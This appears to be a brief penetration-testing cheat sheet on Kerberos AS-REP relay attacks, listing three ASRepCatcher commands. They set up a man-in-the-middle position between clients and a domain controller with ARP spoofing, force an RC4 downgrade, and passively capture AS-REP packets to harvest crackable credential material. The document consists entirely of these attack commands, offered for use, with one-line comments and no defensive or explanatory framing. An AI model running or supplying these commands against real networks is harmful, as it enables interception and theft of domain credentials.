# Kerberos Relays

## ASRep Relay MITM

```bash
# Proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disables ARP spoofing (the MitM must be obtained with other means)
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passively listen for AS-REP packets, no packet alteration
ASRepCatcher listen
```